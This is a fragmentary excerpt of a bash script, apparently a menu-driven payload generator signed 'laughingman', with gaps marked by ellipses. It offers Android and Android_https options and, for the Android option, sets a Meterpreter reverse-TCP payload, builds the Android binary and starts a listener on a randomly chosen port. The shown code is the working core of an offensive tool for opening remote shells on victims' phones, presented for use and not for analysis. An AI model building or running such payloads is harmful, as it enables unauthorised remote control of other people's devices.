...
printf "              \e[1;77m by the one and only laughingman\e[0m\n"
printf "\n"
}
...
default_port4=$(seq 1111 4444 | sort -R | head -n1)
...
printf "\e[1;93m[\e[0m\e[1;77m4\e[0m\e[1;93m] Android\e[0m\n"

printf "\e[1;93m[\e[0m\e[1;77m5\e[0m\e[1;93m] Android_https\e[0m\n"
...
binaries_mac
listener
elif [[ $option_bin == 4 ]]; then
start
payload="android/meterpreter/reverse_tcp"
binaries_Android
listener
elif [[ $option_bin == 5 ]]; then
start
